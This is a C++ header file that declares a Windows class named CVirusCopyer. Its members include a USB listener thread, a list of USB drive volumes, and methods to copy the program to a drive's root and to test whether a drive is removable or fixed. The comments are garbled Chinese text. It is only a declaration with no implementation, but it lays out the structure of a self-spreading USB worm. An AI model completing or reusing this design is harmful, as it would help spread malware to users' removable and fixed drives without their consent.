#pragma once

#include <vector>

using namespace std;

class CVirusCopyer
{
	friend DWORD WINAPI USBListener(LPVOID lpParam);
private:
	vector<char> USBDriveVol;		// the vol of USB drivers
	DWORD threadId;

public:
	CVirusCopyer(void);
	~CVirusCopyer(void);

	//int getUSBDrive(DWORD mask);

	// ����USBDriveVol�����ݣ����������忽����USB�� 
	//bool copyToUsb();
	// �����ĺ���
	//bool copyToDisk();
protected:
	// �������ı��忽����ָ���ľ��ĸ�Ŀ¼��
	BOOL copy(TCHAR vol);

	// �������������ֱ��ƶ��ľ���Ƿ���
	BOOL IsUSBDevice(TCHAR label);
	BOOL IsFixedDevice(TCHAR label);
};

